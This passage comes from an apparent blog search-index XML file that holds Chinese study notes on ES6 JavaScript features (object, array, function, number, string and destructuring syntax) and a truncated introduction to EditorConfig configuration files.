    <content type="text"><![CDATA[es6中，新增对象方法。 属性简洁表示ES6 允许直接写入变量和函数，作为对象的属性和方法。 12345678910111213141516171819202122232425262728/*简写属性*/const foo = 'bar';const baz = &#123;foo&#125;;baz // &#123;foo: "bar"&#125;// 等同于const baz = &#123;foo: foo&#125;;function f(x, y) &#123; return &#123;x, y&#125;;&#125;// 等同于function f(x, y) &#123; return &#123;x: x, y: y&#125;;&#125;f(1, 2) // Object &#123;x: 1, y: 2&#125;/*简写函数*/const o = &#123; method() &#123; return "Hello!"; &#125;&#125;;// 等同于const o = &#123; method: function() &#123; return "Hello!"; &#125;&#125;; 属性名表达式12345678910111213141516/**** es3 ****/// 方法一obj.foo = true;// 方法二obj['a' + 'bc'] = 123;/**** es5 对象定义只有一种 ****/var obj = &#123; foo: true, abc: 123&#125;;/**** es6 可以使用第二种方法定义对象属性 ****/let propKey = 'foo';let obj = &#123; [propKey]: true, ['a' + 'bc']: 123&#125;; 方法的 name 属性函数的name属性，返回函数名。 12345678910111213141516171819202122232425262728293031const person = &#123; sayName() &#123; console.log('hello!'); &#125;,&#125;;person.sayName.name // "sayName"/**** get set ****/const obj = &#123; get foo() &#123;&#125;, set foo(x) &#123;&#125;&#125;;obj.foo.name// TypeError: Cannot read property 'name' of undefinedconst descriptor = Object.getOwnPropertyDescriptor(obj, 'foo');descriptor.get.name // "get foo"descriptor.set.name // "set foo"/**** bind function ****/(new Function()).name // "anonymous"var doSomething = function() &#123; // ...&#125;;doSomething.bind().name // "bound doSomething"/**** Symbol ****/const key1 = Symbol('description');const key2 = Symbol();let obj = &#123; [key1]() &#123;&#125;, [key2]() &#123;&#125;,&#125;;obj[key1].name // "[description]"obj[key2].name // "" Object.is()用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致。不同之处只有两个：一是+0不等于-0，二是NaN等于自身。 12345+0 === -0 //trueNaN === NaN // falseObject.is(+0, -0) // falseObject.is(NaN, NaN) // true Object.assign()Object.assign方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。第一个参数是目标对象，后面的参数都是源对象。 1234567891011121314151617181920const target = &#123; a: 1, b: 1 &#125;;const source1 = &#123; b: 2, c: 2 &#125;;const source2 = &#123; c: 3 &#125;;Object.assign(target, source1, source2);target // &#123;a:1, b:2, c:3&#125;/**** 只有一个参数时，返回该参数 ****/const obj = &#123;a: 1&#125;;Object.assign(obj) === obj // true/**** undefind 和 null不能转换 ****/Object.assign(undefined) // 报错Object.assign(null) // 报错/**** 其他类型的值（即数值、字符串和布尔值）不在首参数，也不会报错。但是，除了字符串会以数组形式，拷贝入目标对象，其他值都不会产生效果。 ****/const v1 = 'abc';const v2 = true;const v3 = 10;const obj = Object.assign(&#123;&#125;, v1, v2, v3);console.log(obj); // &#123; "0": "a", "1": "b", "2": "c" &#125; 注：属于浅拷贝。只拷贝源对象的自身属性（不拷贝继承属性），也不拷贝不可枚举的属性（enumerable: false）。 属性的可枚举性和遍历Object.getOwnPropertyDescriptor方法可以获取该属性的描述对象。 123456789let obj = &#123; foo: 123 &#125;;Object.getOwnPropertyDescriptor(obj, 'foo')// &#123;// value: 123,// writable: true,// enumerable: true,// configurable: true// &#125;/*enumerable: false 时，for...in，Object.keys()，JSON.stringify()，Object.assign()忽略*/ for…in循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）。 Object.keys返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。 Object.getOwnPropertyNames返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名。 Object.getOwnPropertySymbols返回一个数组，包含对象自身的所有 Symbol 属性的键名。 Reflect.ownKeys返回一个数组，包含对象自身的所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举。 Object.getOwnPropertyDescriptors()ES2017 引入了Object.getOwnPropertyDescriptors方法，返回指定对象所有自身属性（非继承属性）的描述对象。 proto属性，Object.setPrototypeOf()，Object.getPrototypeOf() __proto__属性（前后各两个下划线），用来读取或设置当前对象的prototype对象。 Object.setPrototypeOf用来设置一个对象的prototype对象，返回参数对象本身。它是 ES6 正式推荐的设置原型对象的方法。 Object.getPrototypeOf该方法与Object.setPrototypeOf方法配套，用于读取一个对象的原型对象。 Object.keys()，Object.values()，Object.entries() Object.keys方法，返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键名。 Object.values方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值。 Object.entries方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组。 参考链接http://es6.ruanyifeng.com/#docs/object]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
        <tag>Object</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-数组]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[es6中，新增数组方法。 扩展运算符含义扩展运算符（spread）是三个点（…）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 12345console.log(1, ...[2, 3, 4], 5)// 1 2 3 4 5//空数组不产生任何效果[...[], 1]// [1] 替代函数apply12345678910111213// ES5 的写法function f(x, y, z) &#123; console.log(x,y,z)&#125;var args = [0, 1, 2];f.apply(null, args);// ES6的写法function f(x, y, z) &#123; console.log(x,y,z)&#125;let args = [0, 1, 2];f(...args); 应用复制数组1234567const a1 = [1, 2];//es5写法const a2 = a1.concat();// es6写法一const a2 = [...a1];// es6写法二const [...a2] = a1; 合并数组12345var more = [3,4];// ES5[1, 2].concat(more)// ES6[1, 2, ...more] 结构赋值1234// ES5a = list[0], rest = list.slice(1)// ES6[a, ...rest] = list 字符串12345[...'hello']// [ "h", "e", "l", "l", "o" ]'x\uD83D\uDE80y'.length // 4[...'x\uD83D\uDE80y'].length // 3 实现了 Iterator 接口的对象12let nodeList = document.querySelectorAll('div');let array = [...nodeList]; Map 和 Set 结构，Generator 函数12345678910111213let map = new Map([ [1, 'one'], [2, 'two'], [3, 'three'],]);let arr = [...map.keys()]; // [1, 2, 3]const go = function*()&#123; yield 1; yield 2; yield 3;&#125;;[...go()] // [1, 2, 3] Array.from()Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）。 12345678910let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 扩展运算符背后调用的是遍历器接口（Symbol.iterator），如果一个对象没有部署这个接口，就无法转换。任何有length属性的对象，都可以通过Array.from方法转为数组，而此时扩展运算符就无法转换。 Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。 123456Array.from(arrayLike, x =&gt; x * x);// 等同于Array.from(arrayLike).map(x =&gt; x * x);Array.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9] Array.of()Array.of方法用于将一组值，转换为数组。弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。 123Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1 Array.of方法可以用下面的代码模拟实现。 123function ArrayOf()&#123; return [].slice.call(arguments);&#125; 数组实例的 copyWithin()数组实例的copyWithin方法，在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。也就是说，使用这个方法，会修改当前数组。 123Array.prototype.copyWithin(target, start = 0, end = this.length)[1, 2, 3, 4, 5].copyWithin(0, 3) // [4, 5, 3, 4, 5] 数组实例的 find() 和 findIndex()数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。 123[1, 5, 10, 15].find(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 10 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。 123456789[1, 5, 10, 15].findIndex(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 2function f(v)&#123; return v &gt; this.age;&#125;let person = &#123;name: 'John', age: 20&#125;;[10, 12, 26, 15].find(f, person); // 26 数组实例的 fill()fill方法使用给定值，填充一个数组。 12345['a', 'b', 'c'].fill(7)// [7, 7, 7]new Array(3).fill(7)// [7, 7, 7] fill方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。 12['a', 'b', 'c'].fill(7, 1, 2)// ['a', 7, 'c'] 数组实例的 entries()，keys() 和 values()ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。 1234567891011121314151617for (let index of ['a', 'b'].keys()) &#123; console.log(index);&#125;// 0// 1for (let elem of ['a', 'b'].values()) &#123; console.log(elem);&#125;// 'a'// 'b'for (let [index, elem] of ['a', 'b'].entries()) &#123; console.log(index, elem);&#125;// 0 "a"// 1 "b" 数组实例的 includes()Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。 123[1, 2, 3].includes(2) // true[1, 2, 3].includes(4) // false[1, 2, NaN].includes(NaN) // true 空位 forEach(), filter(), reduce(), every() 和some()都会跳过空位。 map()会跳过空位，但会保留这个值 join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。 空位不等于undefind。 120 in [undefined, undefined, undefined] // true0 in [, , ,] // false ES6 则是明确将空位转为undefined。 Array.from方法会将数组的空位，转为undefined，也就是说，这个方法不会忽略空位。 扩展运算符（…）也会将空位转为undefined。 copyWithin()会连空位一起拷贝。 fill()会将空位视为正常的数组位置。 for…of循环也会遍历空位。 entries()、keys()、values()、find()和findIndex()会将空位处理成undefined。 参考链接http://es6.ruanyifeng.com/#docs/array]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-函数]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[es6中，新增函数方法。 参数默认值基本使用12345678910111213//es6之前function fn1(x)&#123; //x = x || 'world'; //当x = false,上式不成立 if (typeof x === 'undefined') &#123; x = 'world'; &#125; console.log('hello'+x);&#125;//es6写法function fn1(x = 'world')&#123; console.log('hello'+x);&#125; 与解构结合1234567891011121314//只有当函数参数等于一个对象时，才会使用函数的默认赋值，下例单纯运用结构赋值。function foo(&#123;x, y = 5&#125;) &#123; console.log(x, y);&#125;foo(&#123;&#125;) // undefined 5foo(&#123;x: 1&#125;) // 1 5foo(&#123;x: 1, y: 2&#125;) // 1 2foo() // TypeError: Cannot read property 'x' of undefined//参数等于对象时函数默认赋值function foo(&#123;x, y = 5&#125; = &#123;&#125;) &#123; console.log(x, y);&#125;foo() // undefined 5 参数相关 默认参数的位置一般在尾部，否则不能省略该参数。 当指定默认参数之后，它的length失真，不再返回其个数。 当设置了默认参数，参数在初始化时形成作用域，初始化结束消失。 rest参数ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。 1234567891011121314function add(...values) &#123; let sum = 0; for (var val of values) &#123; sum += val; &#125; return sum;&#125;add(2, 5, 3) // 10function sortNumbers() &#123; return Array.prototype.slice.call(arguments).sort();&#125;// rest参数的写法const sortNumbers = (...numbers) =&gt; numbers.sort(); 注：rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。函数的length属性，不包括 rest 参数。 严格模式从 ES5 开始，函数内部可以设定为严格模式。ES2016 做了一点修改，规定只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。 name属性函数的name属性，返回该函数的函数名。 123456789101112131415161718var f = function () &#123;&#125;;// ES5f.name // ""// ES6f.name // "f"//如果将一个具名函数赋值给一个变量，则 ES5 和 ES6 的name属性都返回这个具名函数原本的名字。const bar = function baz() &#123;&#125;;bar.name // ES5 "baz"bar.name // ES6 "baz"//Function构造函数返回的函数实例，name属性的值为anonymous。(new Function).name // "anonymous"//bind返回的函数，name属性值会加上bound前缀。function foo() &#123;&#125;;foo.bind(&#123;&#125;).name // "bound foo"(function()&#123;&#125;).bind(&#123;&#125;).name // "bound " 箭头函数基本用法1234var f = function(v) &#123; return v;&#125;;var f = v =&gt; v; 注意点 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。 不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。 不可以使用yield命令，因此箭头函数不能用作 Generator 函数。 双冒号运算符箭头函数可以绑定this对象，大大减少了显式绑定this对象的写法（call、apply、bind）。但是，箭头函数并不适用于所有场合，所以现在有一个提案，提出了“函数绑定”（function bind）运算符，用来取代call、apply、bind调用。函数绑定运算符是并排的两个冒号（::），双冒号左边是一个对象，右边是一个函数。该运算符会自动将左边的对象，作为上下文环境（即this对象），绑定到右边的函数上面。 123456789101112foo::bar;// 等同于bar.bind(foo);foo::bar(...arguments);// 等同于bar.apply(foo, arguments);const hasOwnProperty = Object.prototype.hasOwnProperty;function hasOwn(obj, key) &#123; return obj::hasOwnProperty(key);&#125; 参考链接http://es6.ruanyifeng.com/#docs/function]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
        <tag>Function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-数值]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%95%B0%E5%80%BC%2F</url>
    <content type="text"><![CDATA[es6中改进的数值，新增方法。 回顾es5之前进制转换，通过toSting和parseInt的方式。点击跳转 二进制与八进制ES6 提供了二进制和八进制数值的新的写法，分别用前缀0b（或0B）和0o（或0O）表示。 120b111110111 === 503 // true0o767 === 503 // true Number.isFinite(), Number.isNaN(),Number.isInteger()Number.isFinite()：判断数值是否为有限的(finite)。Number.isNaN()：判断数值是否是NaN。Number.isInteger()：判断数值是否是整数。 与传统的方法不同，不会先调用Number()转换为数值后再进行判断，而是直接判断，不是number类型的直接返回false。 123456789101112131415161718192021Number.isFinite(10); // trueNumber.isFinite(NaN); // falseNumber.isFinite(Infinity); // falseNumber.isFinite(-Infinity); // falseNumber.isFinite('foo'); // falseNumber.isFinite('10'); // falseNumber.isFinite(true); // falseNumber.isNaN(NaN) // trueNumber.isNaN(10) // falseNumber.isNaN('10') // falseNumber.isNaN(true) // falseNumber.isNaN(9/NaN) // trueNumber.isNaN('true'/0) // trueNumber.isNaN('true'/'true') // trueNumber.isInteger(25) // trueNumber.isInteger(25.0) // trueNumber.isInteger(25.1) // falseNumber.isInteger("15") // falseNumber.isInteger(true) // false Number.parseInt(), Number.parseFloat()整合全局方法到Number对象上，行为保持不变。 1234567// ES5的写法parseInt('12.34') // 12parseFloat('123.45#') // 123.45// ES6的写法Number.parseInt('12.34') // 12Number.parseFloat('123.45#') // 123.45 Number.EPSILONNumber.EPSILON 属性表示 1 和大于 1 的最小值（可表示为 Number）的差值。 12345x = 0.1;y = 0.2;z = 0.3;equal = (Math.abs(x + y - z) &lt; Number.EPSILON); //truex+y == z //false Number.isSafeInteger()JavaScript 能够准确表示的整数范围在-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示这个值。Number.isSafeInteger()用来判断是否在该数值范围内。 Math扩展 Math.trunc方法用于去除一个数的小数部分，返回整数部分。非数值默认先调用Number转换。 Math.sign方法的返回值判断一个数到底是正数(+1)、负数(-1)、还是零(0 -0),其他值(NaN)。非数值默认先调用Number转换。 Math.cbrt方法用于计算一个数的立方根。 Math.clz32方法返回一个数的 32 位无符号整数形式有多少个前导 0。 Math.imul方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数。 Math.fround 方法返回一个数的单精度浮点数形式。 Math.hypot方法返回所有参数的平方和的平方根。 Math.expm1(x)返回 ex - 1，即Math.exp(x) - 1。 Math.log1p(x)方法返回1 + x的自然对数，即Math.log(1 + x)。如果x小于-1，返回NaN。 Math.log10(x)返回以 10 为底的x的对数。如果x小于 0，则返回 NaN。 Math.log2(x)返回以 2 为底的x的对数。如果x小于 0，则返回 NaN。 Math.sinh(x) 返回x的双曲正弦（hyperbolic sine） Math.cosh(x) 返回x的双曲余弦（hyperbolic cosine） Math.tanh(x) 返回x的双曲正切（hyperbolic tangent） Math.asinh(x) 返回x的反双曲正弦（inverse hyperbolic sine） Math.acosh(x) 返回x的反双曲余弦（inverse hyperbolic cosine） Math.atanh(x) 返回x的反双曲正切（inverse hyperbolic tangent） Math.sign()用来判断一个值的正负，但是如果参数是-0，它会返回-0。 指数运算符ES2016 新增了一个指数运算符（**）。相当于Math.pow(base,exponent)。 123456789102 ** 2 // 42 ** 3 // 8let a = 1.5;a **= 2;// 等同于 a = a * a;let b = 4;b **= 3;// 等同于 b = b * b * b; 参考链接http://es6.ruanyifeng.com/#docs/number]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
        <tag>Number</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-字符串]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[es6中改进的字符表示，新增方法。 Unicode表示法js允许\uxxxx表示\u0000~\uFFFF之间的字符，超出范围须用两个双字节的形式表示。针对这一点，es6改进可通过\u{xxxx}的方式来实现。 1234567'\z' === 'z' // true'\172' === 'z' // true 8进制'\x7A' === 'z' // true 16进制'\u007A' === 'z' // true'\u&#123;7A&#125;' === 'z' // true'\u&#123;1F680&#125;' === '\uD83D\uDE80'// true 🚀 点击跳转Unicode详细介绍。 String.prototype.codePointAt(pos)相对于String.prototype.charCodeAt()返回0到65535,处理UTF-16的单一编码。该方法能够正确处理 4 个字节储存的字符，传入元素索引的位置，返回在字符串中的给定索引的编码单元体现的数字，未找到返回undefind。字符为两个字节时，返回结果同charCodeAt方法相同。 12345678let s = '𠮷a';s.codePointAt(0) // 134071s.codePointAt(1) // 57271s.codePointAt(2) // 97s.codePointAt(0).toString(16) // "20bb7"s.codePointAt(2).toString(16) // "61" 对于上例中a的下标为2，而不是1，可以通过for...of...来解决。 1234567891011let s = '𠮷a';for (let ch of s) &#123; console.log(ch.codePointAt(0).toString(16));&#125;//简单应用function is32Bit(c) &#123; return c.codePointAt(0) &gt; 0xFFFF;&#125;is32Bit("𠮷") // trueis32Bit("a") // false String.fromCodePoint(num1[, …[, numN]])相对于String.fromCharCode(num1, ..., numN)不能识别大于0xFFFF的码点。如果大于，最高位2被舍弃。该静态方法返回使用指定的代码点序列创建的字符串。传入一串 Unicode 编码(多参数会合并)，返回 Unicode 编码创建的字符串。参数异常，抛出RangeError。 1234String.fromCodePoint(0x20BB7)// "𠮷"String.fromCodePoint(0x78, 0x1f680, 0x79) === 'x\uD83D\uDE80y'// true 字符遍历器for…of相对于传统for，优点是可以识别大于0xFFFF的码点 1234567891011let text = String.fromCodePoint(0x20BB7);for (let i = 0; i &lt; text.length; i++) &#123; console.log(text[i]);&#125;// " "// " "for (let i of text) &#123; console.log(i);&#125;// "𠮷 String.prototype.normalize()按照指定的一种 Unicode 正规形式将当前字符串正规化。传入了非法的参数值, 则会抛出 RangeError 异常.默认NFC形式。 1234567var str = "\u1E9B\u0323";str.normalize("NFC"); // "\u1E9B\u0323"str.normalize(); // same as abovestr.normalize("NFD");// "\u017F\u0323\u0307"str.normalize("NFKC"); // "\u1E69"str.normalize("NFKD"); // "\u0073\u0323\u0307" includes(), startsWith(), endsWith()相对于js只有indexof()方法，es6新增三种. includes()：返回布尔值，表示是否找到了参数字符串。 startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部。 endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部。 第一个参数为需要搜索的字符，第二个参数为开始搜索的位置。endsWith的第二个参数为前N个字符搜索。 123456789let s = 'Hello world!';s.startsWith('Hello') // trues.endsWith('!') // trues.includes('o') // trues.startsWith('world', 6) // trues.endsWith('Hello', 5) // trues.includes('Hello', 6) // false String.prototype.repeat()构造并返回一个新字符串，该字符串包含被连接在一起的指定数量的字符串的副本。参数为负数或infinite，抛出RangeError错误。 12345'x'.repeat(3) // "xxx"'na'.repeat(0) // ""'na'.repeat(Infinity)// RangeError'na'.repeat(-1)// RangeError'na'.repeat(NaN) // "" padStart()，padEnd()ES2017 引入了字符串补全长度的功能。如果某个字符串不够指定长度，会在头部或尾部补全。padStart()用于头部补全，padEnd()用于尾部补全。第一个参数用来指定字符串的最小长度，第二个参数是用来补全的字符串。第二个参数省略时，用空格代替。 1234567891011'x'.padStart(5, 'ab') // 'ababx''x'.padStart(4, 'ab') // 'abax''x'.padEnd(5, 'ab') // 'xabab''x'.padEnd(4, 'ab') // 'xaba''x'.padStart(4) // ' x''x'.padEnd(4) // 'x '//常用'12'.padStart(10, 'YYYY-MM-DD') // "YYYY-MM-12"'09-12'.padStart(10, 'YYYY-MM-DD') // "YYYY-09-12" 模板字符串ES6 引入反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。定义多行字符串时，空格会被保留。 12345678910// 普通字符串`In JavaScript '\n' is a line-feed.`// 多行字符串`In JavaScript this is not legal.`console.log(`string text line 1string text line 2`);// 字符串中嵌入变量let name = "Bob", time = "today";`Hello $&#123;name&#125;, how are you $&#123;time&#125;?` 标签模板模板字符串可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串。 123alert`123`// 等同于alert(123) String.raw()es6为原生String 对象，提供了一个raw方法。用来充当模板字符串的处理函数，返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，对应于替换变量后的模板字符串。 如果原字符串的斜杠已经转义，那么String.raw不会做任何处理。 1234String.raw`Hi\n$&#123;2+3&#125;!`;// "Hi\\n5!"String.raw`Hi\u000A!`;// 'Hi\\u000A!' 参考链接http://es6.ruanyifeng.com/#docs/string]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-解构赋值]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC%2F</url>
    <content type="text"><![CDATA[es6中关于数组解构、对象解构、字符串解构、数值和布尔值解构、函数参数的解构以及其应用场景。 数组的解构赋值基本用法 1let [a, b, c] = [1, 2, 3]; 解构不成功时,变量的值就等于undefined。 1234let [foo] = [];foo // undefinedlet [bar, foo] = [1];foo // undefined 解构成功还会出现不完全解构的情况 1234567let [x, y] = [1, 2, 3];x // 1y // 2let [a, [b], d] = [1, [2, 3], 4];a // 1b // 2d // 4 解构赋值允许指定默认值。 1234let [x = 1] = [undefined];x // 1let [x = 1] = [null];x // null 对象的解构赋值基本用法 123let &#123; foo, bar &#125; = &#123; foo: "aaa", bar: "bbb" &#125;;foo // "aaa"bar // "bbb" 变量名与属性名一致时 1234let &#123; bar, foo ,baz &#125; = &#123; foo: "aaa", bar: "bbb" &#125;;foo // "aaa"bar // "bbb"baz // undefined 变量名与属性名不一致时 123let &#123; foo: baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // "aaa"foo // error: foo is not defined 上个例子出现foo不能识别的情况，原因在于foo是匹配的模式，baz才是变量,下例中loc是模式，也可以变量赋值。 123456789101112const node = &#123; loc: &#123; start: &#123; line: 1, column: 5 &#125; &#125;&#125;;let &#123; loc, loc: &#123; start &#125;, loc: &#123; start: &#123; line &#125;&#125; &#125; = node;line // 1loc // Object &#123;start: Object&#125;start // Object &#123;line: 1, column: 5&#125; 默认赋值解构。对象的属性值严格等于undefined时，取默认值。解构失败也会等于undefined 123456789var &#123;x: y = 3&#125; = &#123;x: 5&#125;;y // 5var &#123;x = 3&#125; = &#123;x: undefined&#125;;x // 3var &#123;x = 3&#125; = &#123;x: null&#125;;x // nulllet &#123;foo: &#123;bar&#125;&#125; = &#123;baz: 'baz'&#125;;foo //报错,foo为undefind，其bar属性不能获取 //相当于let _tmp = &#123;baz: 'baz'&#125;; _tmp.foo.bar 字符串的解构赋值字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。 123456const [a, b, c, d, e] = 'hello';a // "h"b // "e"c // "l"d // "l"e // "o" 类数组存在length属性，可以通过该属性解构 12let &#123;length : len&#125; = 'hello';len // 5 数值和布尔值解构赋值注意：解构赋值时，如果等号右边是数值和布尔值，则会先转为对象。 12345let &#123;toString: s&#125; = 123;s === Number.prototype.toString // truelet &#123;toString: s&#125; = true;s === Boolean.prototype.toString // true 注意：解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象。 12let &#123; prop: x &#125; = undefined; // TypeErrorlet &#123; prop: y &#125; = null; // TypeError 函数参数的解构赋值默认传参 12[[1, 2], [3, 4]].map(([a, b]) =&gt; a + b);// [ 3, 7 ] 函数默认传参 1234567function move(&#123;x, y&#125; = &#123; x: 0, y: 0 &#125;) &#123; return [x, y];&#125;move(&#123;x: 3, y: 8&#125;); // [3, 8]move(&#123;x: 3&#125;); // [3, undefined]move(&#123;&#125;); // [undefined, undefined]move(); // [0, 0] 函数值默认传参,undefined传参会触发函数默认值。 12345678function move(&#123;x = 0, y = 0&#125; = &#123;&#125;) &#123; return [x, y];&#125;move(&#123;x: 3, y: 8&#125;); // [3, 8]move(&#123;x: 3&#125;); // [3, 0]move(&#123;&#125;); // [0, 0]move(); // [0, 0]move(&#123;x: undefined, y: null&#125;) // [0,null] 用途 交换变量 123let x = 1;let y = 2;[x, y] = [y, x]; 从函数返回多个值 1234567891011121314// 返回一个数组function example() &#123; return [1, 2, 3];&#125;let [a, b, c] = example();// 返回一个对象function example() &#123; return &#123; foo: 1, bar: 2 &#125;;&#125;let &#123; foo, bar &#125; = example(); 函数参数的定义 1234567// 参数是一组有次序的值function f([x, y, z]) &#123; ... &#125;f([1, 2, 3]);// 参数是一组无次序的值function f(&#123;x, y, z&#125;) &#123; ... &#125;f(&#123;z: 3, y: 2, x: 1&#125;); 提取JSON数据 123456789let jsonData = &#123; id: 42, status: "OK", data: [867, 5309]&#125;;let &#123; id, status, data: number &#125; = jsonData;console.log(id, status, number); // 42, "OK", [867, 5309] 函数参数的默认值 1234567891011jQuery.ajax = function (url, &#123; async = true, beforeSend = function () &#123;&#125;, cache = true, complete = function () &#123;&#125;, crossDomain = false, global = true, // ... more config&#125;) &#123; // ... do stuff&#125;; 遍历Map结构 123456789const map = new Map();map.set('first', 'hello');map.set('second', 'world');for (let [key, value] of map) &#123; console.log(key + " is " + value);&#125;// first is hello// second is world 输入模块的指定方法 1const &#123; SourceMapConsumer, SourceNode &#125; = require("source-map"); 参考链接http://es6.ruanyifeng.com/#docs/destructuring]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EditorConfig]]></title>
    <url>%2FEditorConfig%2F</url>
    <content type="text"><![CDATA[在多人开发的时候，会出现编码风格统一的问题，这时候需要EditorConfig. EditorConfig简介EditorConfig帮助开发人员在不同的编辑器和IDE之间定义和维护一致的编码风格。EditorConfig项目由用于定义编码样式的文件格式和一组文本编辑器插件组成，这些编辑器可以读取文件格式并遵守定义的样式。EditorConfig文件易于阅读，并且与版本控制系统配合良好。 示例文件123456789101112131415161718192021222324252627282930313233# EditorConfig is awesome: https://EditorConfig.org# top-most EditorConfig fileroot = true# Unix-style newlines with a newline ending every file[*]end_of_line = lfinsert_final_newline = true# Matches multiple files with brace expansion notation# Set default charset[*.&#123;js,py&#125;]charset = utf-8# 4 space indentation[*.py]indent_style = spaceindent_size = 4# Tab indentation (no size specified)[Makefile]indent_style = tab# Indentation override for all JS under lib directory[lib/**.js]indent_style = spaceindent_size = 2# Matches the exact files either package.json or .travis.yml[&#123;package.json,.travis.yml&#125;]indent_style = spaceindent_size = 2 配置EditorConfig文件使用INI格式与所使用的格式兼容的Python ConfigParser库。类似于gitignore格式。只有正斜线（/而不是反斜线）用作路径分隔符，而（#）或分号（;）用于注释。 通配符 通配符 说明 * 匹配任何字符串，除了路径分隔符（/） ** 匹配任何字符串 ? 匹配任何字符串 [name] 与名称中的任何单个字符匹配 [!name] 匹配任何不在名称中的单个字符 {s1,s2,s3} 匹配任何给定的字符串（以逗号分隔） {num1..num2} 匹配num1和num2之间的任何整数，其中num1和num2可以是正值或负值 支持的常用属性 属性名 说明 indent_style 缩进使用tab或者space indent_size 缩进为space时，缩进的字符数 tab_width 缩进为tab时，缩进的宽度 end_of_line 换行符的类型。lf, cr, crlf三种 charset 文件的charset。有以下几种类型：latin1, utf-8, utf-8-bom, utf-16be, utf-16le trim_trailing_whitespace 是否将行尾空格自动删除 insert_final_newline 是否使文件以一个空白行结尾 root 表明是最顶层的配置文件，发现设为true时，才会停止查找.editorconfig文件 更多属性见https://github.com/editorconfig/editorconfig/wiki/EditorConfig-Properties 编辑器支持默认支持 需插件支持 